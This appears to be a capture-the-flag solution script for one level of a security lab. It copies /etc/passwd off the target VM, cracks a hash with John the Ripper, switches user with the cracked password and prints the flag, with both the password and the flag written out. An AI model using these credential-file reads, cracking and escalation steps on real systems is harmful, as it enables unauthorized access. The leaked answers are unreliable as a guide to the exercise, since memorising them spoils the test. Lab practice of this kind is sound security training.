# realize somehow that you have read rights on /etc/passwd and copy home
scp -P4242 level02@{VM_IP}:/etc/passwd passwd
# install nd run john the ripper
git clone https://www.github.com/magnumripper/JohnTheRipper john
cd john/run
./configure LDFLAGS=-L$HOME/.brew/opt/openssl/lib CPPFLAGS=-I$HOME/.brew/opt/openssl/include
make -j4
./john ../../passwd # > abcdefg
# escalate power level
su flag01
abcdefg
# get next flag
getflag # > f2av5il02puano7naaf6adaaf
